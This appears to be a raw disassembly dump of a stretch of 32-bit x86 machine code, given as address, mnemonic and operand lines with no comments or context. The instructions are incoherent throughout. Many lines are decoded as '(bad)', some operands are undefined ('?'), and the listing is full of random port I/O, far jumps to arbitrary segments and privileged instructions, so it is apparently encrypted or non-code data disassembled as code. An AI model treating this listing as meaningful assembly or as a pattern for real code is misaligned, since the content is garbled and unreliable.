  404f4c:	mov    esp,DWORD PTR [ebp+0x637df9d3]
  404f52:	lods   eax,DWORD PTR ds:[esi]
  404f53:	es jno 0x404f56
  404f56:	shr    DWORD PTR [ecx-0x49],cl
  404f59:	mov    cl,0x2a
  404f5b:	neg    DWORD PTR [edx-0x10]
  404f5e:	xor    eax,0xf1a1878a
  404f63:	cmp    BYTE PTR [ecx-0x4154cd1],dh
  404f69:	dec    ebp
  404f6a:	sub    ecx,DWORD PTR [ebx+0x68]
  404f6d:	test   BYTE PTR [esi],al
  404f6f:	nop
  404f70:	retf   0x6c61
  404f73:	shl    BYTE PTR [esi+0x7b30dd63],cl
  404f79:	adc    eax,0xc0441dce
  404f7e:	add    BYTE PTR [ebx+0x2b],al
  404f81:	rcr    dl,0xbe
  404f84:	fyl2x  
  404f86:	and    al,0xef
  404f88:	sub    BYTE PTR [esi],0x71
  404f8b:	pop    ebx
  404f8c:	test   eax,0x205b8f2c
  404f91:	xor    eax,0xbfa4e181
  404f96:	cld    
  404f97:	mov    ds:0xf8fee4fa,al
  404f9c:	mov    esi,0x11e98b42
  404fa1:	adc    eax,0x223f1d51
  404fa6:	sar    BYTE PTR [ebx],1
  404fa8:	xchg   esp,eax
  404fa9:	or     eax,0xc776f7a
  404fae:	lds    ebx,FWORD PTR [ebx-0x20005621]
  404fb4:	xchg   esi,eax
  404fb5:	jbe    0x404fc1
  404fb7:	push   ds
  404fb8:	in     al,0x7e
  404fba:	xor    esi,DWORD PTR [esi+0x6d]
  404fbd:	(bad)  
  404fbf:	mov    edx,0xf53b9f2
  404fc4:	jns    0x405013
  404fc6:	lea    ecx,[eax+0x7106a35d]
  404fcc:	jl     0x404f58
  404fce:	popa   
  404fcf:	shr    DWORD PTR [edi],1
  404fd1:	push   0x3a
  404fd3:	clc    
  404fd4:	jo     0x404ff0
  404fd6:	pop    esp
  404fd7:	or     ch,BYTE PTR [ebp+0x4d]
  404fda:	dec    ebx
  404fdb:	push   ds
  404fdc:	xchg   BYTE PTR [eax+0x41],dl
  404fdf:	scas   eax,DWORD PTR es:[edi]
  404fe0:	mov    ebp,0x8a94518f
  404fe5:	lahf   
  404fe6:	mov    ah,0x30
  404fe8:	out    dx,al
  404fe9:	cmp    bl,BYTE PTR [ecx]
  404feb:	xor    bl,BYTE PTR [esi+0x18dee3cd]
  404ff1:	test   esi,edi
  404ff3:	imul   edx,edi,0xe7abde61
  404ff9:	or     al,0xfb
  404ffb:	dec    ecx
  404ffc:	xor    bl,BYTE PTR [edi+ecx*8]
  404fff:	sub    ecx,DWORD PTR [esi+0x3c6dd442]
  405005:	aad    0xb8
  405007:	or     DWORD PTR [esi-0x14023b46],ebx
  40500d:	add    esi,0x17b3e982
  405013:	mov    ecx,0x453a7f2e
  405018:	je     0x405014
  40501a:	mov    ds:0xa683a5f1,eax
  40501f:	sub    ah,BYTE PTR ds:0xbd940706
  405025:	sbb    DWORD PTR [eax+0x22d9d62],edx
  40502b:	pushf  
  40502c:	sub    DWORD PTR [edi],edx
  40502e:	dec    ebx
  40502f:	imul   edx
  405031:	mov    BYTE PTR [edx-0x18],ah
  405034:	and    edi,esi
  405036:	cld    
  405037:	mov    eax,0x64422efa
  40503c:	jns    0x405047
  40503e:	inc    eax
  40503f:	mov    bh,0x10
  405041:	add    BYTE PTR [edi],0x11
  405044:	push   es
  405045:	ror    eax,cl
  405047:	clc    
  405048:	jmp    0xc3b2:0x847038e0
  40504f:	push   0x2392bfd9
  405054:	push   ds
  405055:	sub    DWORD PTR [esi+eiz*2+0x64c7066c],edx
  40505c:	xchg   edx,eax
  40505d:	stc    
  40505e:	xor    BYTE PTR [edx-0x44],ch
  405061:	cmp    BYTE PTR [ecx-0x23],cl
  405064:	call   0x5707:0xfed95f01
  40506b:	fdivp  st(0),st
  40506d:	adc    esi,edx
  40506f:	xchg   esp,eax
  405070:	push   ss
  405071:	ficom  WORD PTR [eax]
  405073:	push   esp
  405074:	and    BYTE PTR [esi-0x675083e7],0xe8
  40507b:	into   
  40507c:	cmp    edx,DWORD PTR [edi+0x55]
  40507f:	rcr    BYTE PTR ds:0x93a94a1a,0xf7
  405086:	pop    es
  405087:	xor    eax,0x690486b8
  40508c:	idiv   esi
  40508e:	cwde   
  40508f:	push   ss
  405090:	sbb    dh,0x1d
  405093:	xchg   ebp,eax
  405094:	xchg   edx,eax
  405095:	push   ebx
  405096:	mov    ebp,0x1eb955cb
  40509b:	mov    bh,0x29
  40509d:	out    0x50,al
  40509f:	add    bh,al
  4050a1:	(bad)  
  4050a2:	imul   ebx,DWORD PTR [ebp-0x19],0xfffffffc
  4050a6:	cs stos BYTE PTR es:[edi],al
  4050a8:	add    eax,0xc4840729
  4050ad:	out    0x45,al
  4050af:	sub    eax,DWORD PTR [esi-0x61]
  4050b2:	pop    eax
  4050b3:	(bad)
  4050b8:	inc    edi
  4050b9:	cmp    ch,cl
  4050bb:	cmp    ebp,DWORD PTR [esi+0x3e]
  4050be:	out    0x15,eax
  4050c0:	mov    edi,0x4e0715b3
  4050c5:	xchg   ebp,eax
  4050c6:	das    
  4050c7:	jp     0x405125
  4050c9:	mov    DWORD PTR [ebx],ebp
  4050cb:	xchg   ecx,eax
  4050cc:	jns    0x405138
  4050ce:	lock mov ebx,0x70f4a12e
  4050d4:	arpl   ax,cx
  4050d6:	out    dx,al
  4050d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050d8:	jnp    0x405101
  4050da:	sbb    eax,0xda771c45
  4050df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4050e0:	cmp    al,0xd9
  4050e2:	div    ch
  4050e4:	(bad)  
  4050e5:	cli    
  4050e6:	in     eax,0x80
  4050e8:	and    ch,BYTE PTR [ecx]
  4050ea:	rcr    cl,0x1a
  4050ed:	out    0x4b,al
  4050ef:	mov    ds:0x13ccc649,al
  4050f4:	pop    es
  4050f5:	test   eax,0xe7349762
  4050fa:	xor    cl,BYTE PTR [eax-0x50677b3f]
  405100:	xchg   edi,eax
  405101:	mov    DWORD PTR [eax+0x65],esp
  405104:	push   eax
  405105:	aas    
  405106:	test   al,0xfe
  405108:	das    
  405109:	sbb    cl,bh
  40510b:	jmp    0x40517c
  40510d:	lods   eax,DWORD PTR ds:[esi]
  40510e:	or     BYTE PTR [esi-0xb],bh
  405111:	xchg   edi,eax
  405112:	push   esp
  405113:	stos   BYTE PTR es:[edi],al
  405114:	sbb    eax,0xf762ae7
  405119:	enter  0x6d86,0xfa
  40511d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40511e:	xchg   ecx,eax
  40511f:	and    ebp,DWORD PTR [eax-0x61]
  405122:	rol    BYTE PTR [ebx+0x3c],cl
  405125:	xchg   DWORD PTR [edx-0x4f4c28fb],ebp
  40512b:	inc    ebx
  40512c:	bound  edi,QWORD PTR [edi]
  40512e:	mov    ds:0x9c1dc64,al
  405133:	jmp    FWORD PTR [edx+0x17]
  405136:	in     al,dx
  405137:	(bad)  
  405138:	pusha  
  405139:	jg     0x4050ce
  40513b:	cmp    al,dl
  40513d:	das    
  40513e:	sahf   
  40513f:	lock cmp ecx,esi
  405142:	pop    ds
  405143:	neg    cl
  405145:	imul   dh
  405147:	and    ch,BYTE PTR [ebp-0x63]
  40514a:	pop    ds
  40514b:	xor    BYTE PTR [edx+0xe],al
  40514e:	pusha  
  40514f:	or     ebx,DWORD PTR [ebx-0x6d]
  405152:	les    esi,FWORD PTR [ebx+0x433eaa8a]
  405158:	push   es
  405159:	scas   al,BYTE PTR es:[edi]
  40515a:	and    esp,DWORD PTR [ebp+0x5c]
  40515d:	out    dx,al
  40515e:	bsr    esi,DWORD PTR [eax]
  405161:	xor    eax,0x7cc6a060
  405166:	xor    eax,0x5b3daf0b
  40516b:	sbb    eax,0x20f3e76b
  405170:	(bad)  
  405171:	add    DWORD PTR [edx-0x517c3b65],edi
  405177:	fwait
  405178:	mov    al,0x20
  40517a:	lods   eax,DWORD PTR ds:[esi]
  40517b:	ret    
  40517c:	test   ebx,edi
  40517e:	jle    0x40517d
  405180:	pop    es
  405181:	mov    dl,0x3a
  405183:	into   
  405184:	mov    ah,0xf5
  405186:	fwait
  405187:	call   0xa6a6:0xae6c6ab3
  40518e:	xor    eax,0xbd1f0f51
  405193:	inc    edx
  405194:	and    eax,0xc740cd25
  405199:	jns    0x4051ac
  40519b:	das    
  40519c:	(bad)  
  40519d:	nop
  40519e:	inc    esi
  40519f:	sub    al,BYTE PTR [ebp-0x6d]
  4051a2:	test   eax,0xbed4e257
  4051a7:	adc    esp,DWORD PTR [edi+eax*8-0x569dceb8]
  4051ae:	shl    BYTE PTR [edx+0x44a0afe0],cl
  4051b4:	sub    al,0x5b
  4051b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4051b7:	pop    esi
  4051b8:	or     BYTE PTR [eax+eiz*1],ah
  4051bb:	cmp    al,0x29
  4051bd:	addr16 dec edi
  4051bf:	sbb    eax,0x9d90f0a4
  4051c4:	movups xmm6,xmm3
  4051c7:	xor    bh,BYTE PTR [ebx]
  4051c9:	out    dx,eax
  4051ca:	inc    esi
  4051cb:	das    
  4051cc:	retf   0x511
  4051cf:	ror    eax,1
  4051d1:	shl    DWORD PTR [ebx+0x22bd3507],cl
  4051d7:	mov    eax,ds:0x86cc759c
  4051dc:	cli    
  4051dd:	retf   0xfa3d
  4051e0:	lods   al,BYTE PTR ds:[esi]
  4051e1:	mov    DWORD PTR [edi-0x22],eax
  4051e4:	test   DWORD PTR [ebx],eax
  4051e6:	mov    ebp,0x518d7916
  4051eb:	adc    eax,DWORD PTR [edi]
  4051ed:	xor    BYTE PTR ss:[edx-0x68bbdac1],ah
  4051f4:	std    
  4051f5:	cli    
  4051f6:	rcl    DWORD PTR [ecx+0x4fc2d74d],0x98
  4051fd:	pop    edi
  4051fe:	mov    al,BYTE PTR [edi]
  405200:	jmp    0x87f525ad
  405205:	jbe    0x4051ff
  405207:	mov    ch,BYTE PTR [ebp+0x32bcd20a]
  40520d:	inc    bx
  40520f:	(bad)  
  405210:	jmp    0xc11a:0xe50a98cc
  405217:	or     DWORD PTR [edx+0x470ae087],edx
  40521d:	lea    ecx,ds:0x450a432d
  405223:	pop    edi
  405224:	shl    DWORD PTR [ebx+0x3257c2a7],cl
  40522a:	fsubr  QWORD PTR ds:0x15e84ec
  405230:	mov    bh,0xb2
  405232:	jno    0x405218
  405234:	sub    BYTE PTR [esi+ecx*2],ah
  405237:	sub    al,0x7
  405239:	adc    DWORD PTR [ebx-0x9648de6],esp
  40523f:	sbb    ebx,DWORD PTR [ebp-0x26]
  405242:	xor    BYTE PTR [edx],bl
  405244:	sbb    eax,0x1af5f21f
  405249:	jecxz  0x405250
  40524b:	inc    esi
  40524c:	fld    QWORD PTR [edi]
  40524e:	ret    0xc7ba
  405251:	mov    al,0x40
  405253:	in     eax,0x26
  405255:	call   0x8bcc:0x2a3adef5
  40525c:	test   al,0x98
  40525e:	retf   
  40525f:	sub    al,0x17
  405261:	mov    ds:0xbaebd053,al
  405266:	pop    ebp
  405267:	(bad)  
  405268:	jg     0x405247
  40526a:	push   ds
  40526b:	neg    DWORD PTR [edx+0x31cda97a]
  405271:	mov    eax,DWORD PTR [eax+0x26]
  405274:	test   DWORD PTR [edx+0x544e46b3],eax
  40527a:	push   ebx
  40527b:	shr    edi,0x43
  40527e:	jb     0x405240
  405280:	inc    ecx
  405281:	call   0xacf6:0xab8aac1c
  405288:	arpl   WORD PTR [ecx],sp
  40528a:	int    0xac
  40528c:	adc    BYTE PTR [ecx+0x51],ch
  40528f:	lock hlt 
  405291:	or     BYTE PTR [ebp-0x21],bh
  405294:	pop    edi
  405295:	int    0xca
  405297:	adc    BYTE PTR [eax+ebp*8+0x70],bh
  40529b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40529c:	xor    al,0x6c
  40529e:	pop    edi
  40529f:	into   
  4052a0:	sub    eax,0xb7ef12fb
  4052a5:	push   ds
  4052a6:	pop    ebx
  4052a7:	clc    
  4052a8:	mov    ch,bh
  4052aa:	fwait
  4052ab:	mov    ds:0x912779ec,al
  4052b0:	mov    WORD PTR [esi+0x7dc9fc61],?
  4052b6:	aad    0x68
  4052b8:	xor    ebp,DWORD PTR [edi]
  4052ba:	sar    BYTE PTR [eax+0x28],0xcc
  4052be:	scas   eax,DWORD PTR es:[edi]
  4052bf:	std    
  4052c0:	adc    eax,0xbc759d2a
  4052c5:	leave  
  4052c6:	outs   dx,BYTE PTR ds:[esi]
  4052c7:	xlat   BYTE PTR ds:[ebx]
  4052c9:	push   edx
  4052ca:	in     eax,dx
  4052cb:	out    0x1a,al
  4052cd:	and    al,BYTE PTR [esi]
  4052cf:	je     0x405296
  4052d1:	mov    dl,0x4e
  4052d3:	inc    ebp
  4052d4:	xchg   ebx,eax
  4052d5:	jle    0x405257
  4052d7:	jmp    0x74492b2a
  4052dc:	in     al,0x6
  4052de:	mov    ah,0xc2
  4052e0:	test   DWORD PTR [ebp-0x69],ebp
  4052e3:	sar    ah,0x44
  4052e6:	call   0xc5c037a0
  4052eb:	xor    eax,0x8550b6ff
  4052f0:	into   
  4052f1:	push   cs
  4052f2:	push   ecx
  4052f3:	and    bh,BYTE PTR [edx]
  4052f5:	xchg   ebx,eax
  4052f6:	out    dx,al
  4052f7:	xchg   edi,eax
  4052f8:	xchg   DWORD PTR [ecx+0x3bb087f3],edi
  4052fe:	dec    ecx
  4052ff:	or     edi,ebp
  405301:	sbb    eax,0x1c676dc8
  405306:	push   ecx
  405307:	shr    BYTE PTR [esi+edx*4+0x53],1
  40530b:	dec    DWORD PTR [edx-0x1607985f]
  405311:	loop   0x405315
  405313:	cmp    DWORD PTR [esp+ebp*8+0x61a8957d],edx
  40531a:	push   cs
  40531b:	rcl    DWORD PTR [ebp+0x2a],1
  40531e:	pop    ebp
  40531f:	repz sub al,0x34
  405322:	and    al,0x83
  405324:	scas   al,BYTE PTR es:[edi]
  405325:	ins    DWORD PTR es:[edi],dx
  405326:	sbb    edi,ecx
  405328:	stc    
  405329:	gs xchg ecx,eax
  40532b:	jmp    0x4052ae
  40532d:	cli    
  40532e:	add    esp,DWORD PTR [ecx-0x7bc945c3]
  405334:	jns    0x405380
  405336:	dec    ebx
  405337:	inc    eax
  405338:	sbb    bh,bh
  40533a:	ja     0x4052df
  40533c:	in     eax,0xbe
  40533e:	xchg   al,cl
  405340:	neg    ebp
  405342:	jno    0x405360
  405344:	jo     0x405335
  405346:	mov    edi,0xfcb38be4
  40534b:	mov    ecx,0x313f444b
  405350:	xchg   BYTE PTR [ebp+edx*2-0x4ac1d03d],bh
  405357:	in     eax,0x5f
  405359:	add    esp,eax
  40535b:	loopne 0x40530c
  40535d:	sbb    BYTE PTR [edx-0x6],0xde
  405361:	or     cl,al
  405363:	or     ch,0x7a
  405366:	mov    al,0x8a
  405368:	out    dx,eax
  405369:	stc    
  40536a:	jo     0x40531a
  40536c:	cdq    
  40536d:	mov    dl,0x18
  40536f:	push   eax
  405370:	adc    eax,0xf26fa391
  405375:	pusha  
  405376:	push   ebx
  405377:	in     eax,dx
  405378:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405379:	out    0xfd,al
  40537b:	test   al,0x1f
  40537d:	xchg   ebx,eax
  40537e:	lea    esp,[ecx+ebp*2]
  405381:	icebp  
  405382:	popf   
  405383:	bnd jmp 0x4053ec
  405386:	mov    bl,0x53
  405388:	sub    ecx,esp
  40538a:	or     al,0x35
  40538c:	jnp    0x405407
  40538e:	imul   ebx,esi,0xaec94551
  405394:	out    dx,eax
  405395:	jmp    0x405394
  405397:	aam    0xcb
  405399:	rol    DWORD PTR [ecx],1
  40539b:	dec    eax
  40539c:	bound  esp,QWORD PTR [ebp+0x4d44ad3]
  4053a2:	mov    al,ds:0xd5fbd623
  4053a7:	stos   DWORD PTR es:[edi],eax
  4053a8:	mov    BYTE PTR [ecx-0x71],ch
  4053ab:	lds    eax,FWORD PTR [ecx]
  4053ad:	dec    ebp
  4053ae:	unpckhps xmm6,xmm7
  4053b1:	fild   DWORD PTR [ebx+0x70]
  4053b4:	outs   dx,DWORD PTR ds:[esi]
  4053b5:	push   ebp
  4053b6:	jg     0x4053d7
  4053b8:	scas   eax,DWORD PTR es:[edi]
  4053b9:	cld    
  4053ba:	ins    BYTE PTR es:[edi],dx
  4053bb:	xchg   ebp,eax
  4053bc:	push   edi
  4053bd:	xor    BYTE PTR [ebp+0x3b],ah
  4053c0:	mov    bl,0xe5
  4053c2:	lea    ebx,[edx-0x49]
  4053c5:	xchg   esp,eax
  4053c6:	adc    BYTE PTR [edi],dl
  4053c8:	jl     0x4053c7
  4053ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053cc:	loope  0x40542e
  4053ce:	je     0x405381
  4053d0:	test   eax,0x5eb8fbe2
  4053d5:	ins    BYTE PTR es:[edi],dx
  4053d6:	iret   
  4053d7:	inc    edi
  4053d8:	and    ah,dl
  4053da:	je     0x4053fb
  4053dc:	mov    esi,0xfd4d6e85
  4053e1:	pop    esp
  4053e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053e3:	mov    eax,ds:0x97152501
  4053e8:	aam    0x40
  4053ea:	push   0xc7057c45
  4053ef:	repnz xor esi,DWORD PTR [esi+0x36]
  4053f3:	xor    DWORD PTR [eax-0x18],0xc78f5b73
  4053fa:	out    0xdf,al
  4053fc:	aam    0xd0
  4053fe:	mov    ah,0xa3
  405400:	sbb    BYTE PTR [ecx+0x707416a1],bh
  405406:	(bad)  
  405407:	jp     0x4053da
  405409:	pop    edx
  40540a:	sub    eax,0x16b5cfce
  40540f:	jge    0x4053ac
  405411:	aaa    
  405412:	addr16 push esi
  405414:	test   DWORD PTR [edx+0x16],esp
  405417:	jmp    0xa87c:0xa62a5ac4
  40541e:	xchg   BYTE PTR [esi+0x2f],al
  405421:	cmp    bl,BYTE PTR [esp+esi*8]
  405424:	or     edi,DWORD PTR [eax+ecx*8-0x20]
  405428:	or     dh,cl
  40542a:	aad    0x3b
  40542c:	cmp    al,0x65
  40542e:	xor    bl,bl
  405430:	mov    ecx,0x6a10801
  405435:	push   ds
  405436:	cmp    al,0x50
  405438:	sti    
  405439:	or     bh,BYTE PTR [ebp+0x8]
  40543c:	aaa    
  40543d:	shl    DWORD PTR [ebx],cl
  40543f:	dec    edx
  405440:	ja     0x40549a
  405442:	xchg   esp,eax
  405443:	shl    DWORD PTR [edi-0x148ded4e],cl
  405449:	aam    0xbd
  40544b:	(bad)  
  40544c:	scas   al,BYTE PTR es:[di]
  40544e:	je     0x40548b
  405450:	jecxz  0x405411
  405452:	push   ds
  405453:	lods   eax,DWORD PTR ds:[esi]
  405454:	or     ebp,DWORD PTR [edx]
  405456:	(bad)  
  405457:	(bad)  
  405458:	in     al,0xcf
  40545a:	(bad)  
  40545b:	xor    DWORD PTR [edi+0x6406d83d],ecx
  405461:	or     BYTE PTR [bp+di+0x4e],dh
  405465:	xchg   esp,eax
  405466:	mov    edi,0xf4f8b4ff
  40546b:	pusha  
  40546c:	add    BYTE PTR [edx-0x45],ah
  40546f:	pop    ebp
  405470:	loop   0x4054d6
  405472:	xchg   edi,eax
  405473:	jbe    0x405484
  405475:	bound  ebx,QWORD PTR [ebx-0x73c92c9c]
  40547b:	jp     0x40547b
  40547d:	jo     0x4054c4
  40547f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405480:	outs   dx,DWORD PTR ds:[esi]
  405481:	xchg   ebp,eax
  405482:	nop
  405483:	retf   
  405484:	push   edx
  405485:	rcl    DWORD PTR [edi],cl
  405487:	aam    0xf
  405489:	lahf   
  40548a:	outs   dx,BYTE PTR ds:[esi]
  40548b:	sbb    al,0x10
  40548d:	adc    bh,BYTE PTR [ecx-0x21]
  405490:	xchg   ecx,eax
  405491:	mov    edi,0x1994d85c
  405496:	mov    dh,0x92
  405498:	popf   
  405499:	jo     0x4054b4
  40549b:	cld    
  40549c:	jbe    0x40546b
  40549e:	dec    eax
  40549f:	(bad)  
  4054a0:	es lahf 
  4054a2:	cmp    edx,DWORD PTR [ebp-0x36e895cf]
  4054a8:	jmp    0x4054cd
  4054aa:	adc    DWORD PTR [esi+0x4b],0x3fc4f65f
  4054b1:	das    
  4054b2:	mov    cl,0xa6
  4054b4:	jge    0x40547f
  4054b6:	sbb    al,0x98
  4054b8:	imul   edx,edx,0xc8478757
  4054be:	sbb    edi,DWORD PTR [edx+0x44]
  4054c1:	das    
  4054c2:	popf   
  4054c3:	xor    BYTE PTR [ebx-0x3f54c357],bh
  4054c9:	data16 or al,0xdf
  4054cc:	add    BYTE PTR [ecx+0x75461ee],0x88
  4054d3:	(bad)  
  4054d4:	test   eax,0x89a18460
  4054d9:	cmc    
  4054da:	add    bh,ah
  4054dc:	mov    ecx,0x7f3d89e7
  4054e1:	ds lahf 
  4054e3:	mov    eax,ds:0xcd082e0b
  4054e8:	mov    eax,ds:0xa188719f
  4054ed:	push   cs
  4054ee:	pop    ds
  4054ef:	imul   ecx,DWORD PTR [ebx-0x10],0xcac5437
  4054f6:	add    dl,BYTE PTR [ebx+eiz*1]
  4054f9:	jecxz  0x4054d1
  4054fb:	gs adc eax,0x506a8b75
  405501:	(bad)  
  405502:	loop   0x4054b0
  405504:	shl    DWORD PTR [eax],cl
  405506:	pusha  
  405507:	dec    esi
  405508:	int    0x2c
  40550a:	stc    
  40550b:	push   esp
  40550c:	ins    BYTE PTR es:[edi],dx
  40550d:	dec    ecx
  40550e:	mov    ah,0x68
  405510:	inc    eax
  405511:	mov    al,ds:0x8a80c98b
  405516:	rol    BYTE PTR [ebx+ebp*8-0xee6b302],0x59
  40551e:	adc    ecx,edx
  405520:	mov    edx,0x3c9658fe
  405525:	icebp  
  405526:	shl    BYTE PTR [ecx],cl
  405528:	mov    dh,0x96
  40552a:	sub    al,BYTE PTR [edi-0x3cc8cbd1]
  405530:	sub    edx,DWORD PTR [ecx]
  405532:	push   ebx
  405533:	sub    ecx,DWORD PTR [ebx]
  405535:	jns    0x4054f0
  405537:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405538:	jae    0x405557
  40553a:	stc    
  40553b:	popf   
  40553c:	xchg   esi,eax
  40553d:	cmp    edx,DWORD PTR [ebx]
  40553f:	out    0x4f,al
  405541:	cmp    ecx,DWORD PTR [esi]
  405543:	push   ds
  405544:	div    ecx
  405546:	dec    ebp
  405547:	mov    dh,0xf6
  405549:	retf   
  40554a:	repz sbb al,BYTE PTR fs:[eax]
  40554e:	addr16 ja 0x405558
  405551:	loopne 0x405561
  405553:	mov    ch,0x69
  405555:	dec    ebx
  405556:	xor    bl,BYTE PTR [edx+esi*1-0x7c5f00cb]
  40555d:	sbb    ecx,DWORD PTR [ebp-0x319f2014]
  405563:	outs   dx,DWORD PTR ds:[esi]
  405564:	cwde   
  405565:	in     al,dx
  405566:	xchg   esp,eax
  405567:	push   0x73e28184
  40556c:	cvtps2pi mm2,QWORD PTR [esp+ecx*8+0x17]
  405571:	ror    BYTE PTR [ebx-0x26a5e246],0x6c
  405578:	dec    edx
  405579:	jmp    0x9173:0xbcf61ef9
  405580:	push   edi
  405581:	add    edi,DWORD PTR [edi]
  405583:	jb     0x40551c
  405585:	pop    es
  405586:	jb     0x405538
  405588:	pusha  
  405589:	sub    cl,BYTE PTR ds:0xd734e6bb
  40558f:	loopne 0x4055de
  405591:	inc    eax
  405592:	fcmovnu st,st(6)
  405594:	sbb    eax,0xc0b3e7ec
  405599:	push   ds
  40559a:	imul   eax,eax,0xffffffec
  40559d:	mov    esi,0xa254e346
  4055a2:	or     bl,al
  4055a4:	mov    ebx,0x2a8c3fcf
  4055a9:	jnp    0x405613
  4055ab:	add    DWORD PTR [edx+0x5dc9969b],0x26f7422f
  4055b5:	cmp    esi,ecx
  4055b7:	js     0x4055b1
  4055b9:	lahf   
  4055ba:	cmc    
  4055bb:	mov    esp,0x11d74099
  4055c0:	loope  0x40563d
  4055c2:	mov    ebx,0x8e18f746
  4055c7:	pushf  
  4055c8:	jle    0x40563d
  4055ca:	xor    BYTE PTR [ecx+0x2],ah
  4055cd:	mov    eax,ds:0x2054f27c
  4055d2:	cmp    ah,BYTE PTR [ebx+0x4da91fae]
  4055d8:	retf   
  4055d9:	fistp  WORD PTR [edi+ecx*8+0x1d8921dc]
  4055e0:	push   edi
  4055e1:	ja     0x405594
  4055e3:	pop    ds
  4055e4:	xor    DWORD PTR [ebp-0x53],0x6b
  4055e8:	push   esi
  4055e9:	aam    0xd
  4055eb:	aas    
  4055ec:	xor    DWORD PTR [ebx-0x39f20611],ebx
  4055f2:	dec    di
  4055f4:	pushf  
  4055f5:	xlat   BYTE PTR ds:[ebx]
  4055f6:	popf   
  4055f7:	scas   eax,DWORD PTR es:[edi]
  4055f8:	or     eax,0xa0b296a2
  4055fd:	xor    esp,DWORD PTR [esi+0x3106239]
  405603:	arpl   WORD PTR [eax+ecx*4+0x62],di
  405607:	std    
  405608:	test   ebp,esi
  40560a:	mov    ebx,0x56f5c664
  40560f:	and    BYTE PTR [eax+0xc],bl
  405612:	add    eax,0x9c5ef9
  405617:	inc    eax
  405618:	retf   
  405619:	ret    0x775f
  40561c:	jmp    0x4fb86fa8
  405621:	sbb    esi,DWORD PTR [ecx]
  405623:	lock mov ch,0x58
  405627:	scas   eax,DWORD PTR es:[edi]
  405628:	jns    0x405627
  40562a:	(bad)  
  40562b:	pusha  
  40562c:	ficomp WORD PTR [ebx+0x5010922f]
  405632:	imul   esi,DWORD PTR [ecx+0x51],0xcf9dbabe
  405639:	mov    eax,ds:0x7a80e935
  40563e:	xchg   esp,eax
  40563f:	hlt    
  405640:	inc    esi
  405641:	and    DWORD PTR [edx-0x23],ebx
  405644:	sbb    edi,DWORD PTR [ebp+0x7d]
  405647:	in     eax,0x69
  405649:	cdq    
  40564a:	or     dl,BYTE PTR [eax-0x2]
  40564d:	jbe    0x4055d5
  40564f:	adc    DWORD PTR [eax],eax
  405651:	mov    WORD PTR [esi+0x47cb0111],?
  405657:	(bad)  
  405658:	lods   eax,DWORD PTR ds:[esi]
  405659:	mov    cl,0x5c
  40565b:	rcl    ah,0xae
  40565e:	test   eax,0x65695ecd
  405663:	loope  0x4056b1
  405665:	mov    bl,0xf5
  405667:	aas    
  405668:	or     al,0x43
  40566a:	imul   esi,DWORD PTR [edx+0x56],0xadb6a23f
  405671:	add    BYTE PTR [edi],cl
  405673:	mov    ch,0x6f
  405675:	and    ebx,eax
  405677:	inc    esp
  405678:	daa    
  405679:	imul   BYTE PTR [ebx]
  40567b:	push   ds
  40567c:	rol    DWORD PTR [edx],0x3f
  40567f:	or     DWORD PTR [edi],0x25acffc7
  405685:	call   0xa42aa21e
  40568a:	mov    esi,0xb1e4d2d1
  40568f:	jg     0x4056d7
  405691:	mov    BYTE PTR [ecx-0x59c0822b],al
  405697:	aad    0x84
  405699:	xchg   BYTE PTR [esi-0x73],ah
  40569c:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  40569e:	jo     0x40562f
  4056a0:	inc    edi
  4056a1:	cmp    eax,0x2394ee3d
  4056a6:	imul   ebp,DWORD PTR [ebx],0xffffffd2
  4056a9:	call   0x2e9a:0x2f5cf28c
  4056b0:	mov    bh,0x87
  4056b2:	jg     0x4056b2
  4056b4:	stos   DWORD PTR es:[edi],eax
  4056b5:	pop    es
  4056b6:	js     0x405651
  4056b8:	push   DWORD PTR [ebp+0x3c77d898]
  4056be:	inc    esp
  4056bf:	cmp    edi,eax
  4056c1:	int    0xec
  4056c3:	jo     0x405682
  4056c5:	dec    ebx
  4056c6:	sahf   
  4056c7:	sub    cl,ch
  4056c9:	jb     0x4056de
  4056cb:	stc    
  4056cc:	stc    
  4056cd:	jl     0x405707
  4056cf:	xor    dh,ah
  4056d1:	push   edi
  4056d2:	push   ecx
  4056d3:	mov    dl,0x28
  4056d5:	dec    ebp
  4056d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056d7:	pop    edx
  4056d8:	jle    0x40570b
  4056da:	rcr    DWORD PTR [ebp+0x45e6b2f7],cl
  4056e0:	les    ebx,FWORD PTR [edi+edi*4+0x6aa28954]
  4056e7:	retf   
  4056e8:	xor    DWORD PTR [edx+0x476ef15b],0x91354750
  4056f2:	(bad)  
  4056f3:	ficomp DWORD PTR [eax+edi*4+0x48d1c46c]
  4056fa:	out    0xb1,al
  4056fc:	mov    ch,0x33
  4056fe:	cmp    al,0x3a
  405700:	addr16 sbb al,0xbd
  405703:	in     eax,0xd1
  405705:	sbb    eax,0x3c9f1be3
  40570a:	add    DWORD PTR es:[eax],esi
  40570d:	ror    BYTE PTR [ebx-0x19caa534],1
  405713:	jmp    FWORD PTR [edx]
  405715:	cmc    
  405716:	int    0x5e
  405718:	das    
  405719:	imul   eax,DWORD PTR [esi+ebx*2+0x6d],0x87baf4cb
  405721:	scas   eax,DWORD PTR es:[edi]
  405722:	ja     0x40578c
  405724:	cld    
  405725:	shl    esp,1
  405727:	shl    BYTE PTR cs:[ecx+ecx*2-0x61],cl
  40572c:	dec    ebp
  40572d:	jg     0x40572a
  40572f:	test   eax,0x29a0fb8b
  405734:	sub    esi,DWORD PTR ds:0xc249830a
  40573a:	or     eax,ecx
  40573c:	mov    edx,0xe96d9c2
  405741:	pop    eax
  405742:	imul   eax,DWORD PTR [esi+esi*4+0x5f508e45],0x91be29e5
  40574d:	aas    
  40574e:	xor    BYTE PTR [eax+0x1e],cl
  405751:	sub    eax,0x4ca64139
  405756:	or     BYTE PTR [edi+0x4e],0x3b
  40575a:	xchg   esi,eax
